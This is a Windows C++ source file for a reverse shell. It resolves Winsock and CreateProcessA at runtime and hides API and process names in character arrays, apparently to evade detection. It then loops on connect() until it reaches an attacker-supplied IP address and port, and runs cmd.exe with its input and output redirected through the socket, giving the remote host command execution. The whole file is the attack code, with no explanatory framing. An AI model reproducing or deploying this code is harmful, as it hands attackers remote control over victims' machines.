#define  _WINSOCK_DEPRECATED_NO_WARNINGS
#include "Winsock2.h"
#include "windows.h"
#include "iostream"

#pragma comment(lib, "Ws2_32.lib")


void Reverse_Shell(const char* IP_Address , int Port)
{
    char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    HMODULE hkernel32 = GetModuleHandleA(kernel32);

    HMODULE dllhandle;
    dllhandle = LoadLibrary(TEXT("Ws2_32.dll"));

    char WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
    using WSAStartupPrototype = int(WINAPI*)(WORD , LPWSADATA);
    WSAStartupPrototype hWSAStartup = (WSAStartupPrototype)GetProcAddress(dllhandle, WSAStartup);

    char WSASocketA[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
    using WSASocketAPrototype = SOCKET(WINAPI*)(int, int, int , LPWSAPROTOCOL_INFOA , GROUP , DWORD);
    WSASocketAPrototype hWSASocketA = (WSASocketAPrototype)GetProcAddress(dllhandle, WSASocketA);

  
    using CreateProcessPrototype = BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR , LPSTARTUPINFOA , LPPROCESS_INFORMATION);
    CreateProcessPrototype hCreateProcessA = (CreateProcessPrototype)GetProcAddress(hkernel32, "CreateProcessA");
   

 


  

    WSADATA wsaData;

    // Call WSAStartup()
    int WSAStartup_Result = hWSAStartup(MAKEWORD(2, 2), &wsaData);
    if (WSAStartup_Result != 0) {
        std::cout << "[-] WSAStartup initialization failed.";
        EXIT_FAILURE;
    }

    // Call WSASocket()
    SOCKET mysocket = hWSASocketA(2, 1, 6, NULL, 0, NULL);

    // Create sockaddr_in struct
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(IP_Address);
    sa.sin_port = htons(Port);

    // Call connect()
    /*
    int connect_Result = connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
    if (connect_Result != 0) {
        std::cout << "[-] connection failed.";
        EXIT_FAILURE;
    }
    else
        std::cout << "[-] Reverse Shell Established"<<std::endl;
    */

    while (true)
    {
       int connect_Result=connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
       if (connect_Result == 0)
           break;
    }


    // Call CreateProcessA()
    char Process[] = {'c','m','d','.','e','x','e',0};

    STARTUPINFO si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES);
    si.hStdInput = (HANDLE)mysocket;
    si.hStdOutput = (HANDLE)mysocket;
    si.hStdError = (HANDLE)mysocket;
    PROCESS_INFORMATION pi;
    hCreateProcessA(NULL, (LPSTR)Process, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);

}
